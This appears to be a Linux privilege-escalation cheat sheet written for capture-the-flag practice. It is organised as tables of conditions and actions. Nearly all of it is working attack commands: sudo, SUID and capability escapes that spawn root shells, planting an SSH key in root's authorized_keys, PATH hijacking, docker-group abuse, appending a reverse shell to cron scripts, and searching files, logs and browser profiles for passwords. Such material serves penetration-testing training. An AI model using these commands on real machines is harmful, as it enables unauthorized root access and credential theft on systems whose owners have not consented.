
#### `sudo -l` -> what can you run?

| Condition | Action |
|---|---|
| tar | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` ·|
| vi / vim | `sudo vi -c ':!/bin/bash' /dev/null` ·|
| perl + writable script | Overwrite the script it calls ·|
| NOPASSWD: ALL | `sudo bash -i` instant root ·|
| !root quirk (CVE) | `sudo -u \#$((0xffffffff)) /bin/bash`|
| python3 runs a script (as other user) | Script uses relative import -> drop fake module in same dir: `echo 'import os; os.system("/bin/bash")' > random.py` then `sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py` ·|

#### SUID / custom binary?
[GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities) for some guidance in this world

| Condition | Action |
|---|---|
| Find them | `find / -user root -perm /4000 2>/dev/null` |
| nmap | `nmap --interactive` → `!sh` ·|
| python / python2.7 | `python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'` ·|
| xxd (SUID) | `echo 'ssh-key...' \| xxd \| /opt/xxd -r - /root/.ssh/authorized_keys` ·|
| named binary + version | Google binary name + version for public exploit ·|

**PATH hijacking workflow** binary calls a command without absolute path

1. Transfer binary to attacker: victim runs `python3 -m http.server 8000`, attacker runs `wget http://victim:8000/binary`
2. Find relative calls: `strings binary | awk 'length($0) > 10'` look for commands without a leading `/`
3. Create fake command in a writable dir: `echo -e '#!/bin/bash\n/bin/bash' > date && chmod +x date`
4. Prepend that dir to PATH: `export PATH=/home/rabbit:$PATH`
5. Run the SUID binary it picks up your fake command

*Wonderland (teaParty → date), Archangel (backup -> cp)*

#### Linux Capabilities?

| Condition | Action |
|---|---|
| Find them | `getcap -r / 2>/dev/null` |
| perl cap_setuid | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` ·|
| python cap_setuid | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| Any binary | Check GTFOBins "Capabilities" section https://gtfobins.github.io |

#### Cron jobs / writable scripts?

| Condition | Action |
|---|---|
| Find running jobs | `pspy64` or `cat /etc/crontab` |
| Writable called script | Append reverse shell, wait for cron ·|
| systemd timer | Edit writable .timer, daemon-reload, trigger manually ·|

#### Special group membership?

| Condition | Action |
|---|---|
| docker group | `docker run -v /etc/:/mnt -it alpine` ·|
| adm group | Read `/var/log/*` may contain passwords ·|

#### Lateral movement / other users?

| Condition | Action |
|---|---|
| MySQL on box | `grep -r "password" /var/www/ 2>/dev/null` ·|
| SSH key found | `chmod 600 id_rsa && ssh -i id_rsa user@$IP` ·|
| Firefox saved creds | Copy .firefox profile to attacker, open in Firefox Lockwise ·|
| grep logs / files | `grep -iR username /home /var/log 2>/dev/null` ·|
| password.txt in home | After lateral move, always `ls` the new user's home ·|
| Check /opt/ for creds | /opt/ is a common place for leftover config and note files with plaintext credentials — always check it `ls /opt/ && cat /opt/*.txt` |
| Internal service note files | After getting a user shell, check home dir for .txt files pointing to internal services (Docker, Jenkins, DBs) `ls -a ~/ && cat ~/*.txt` |
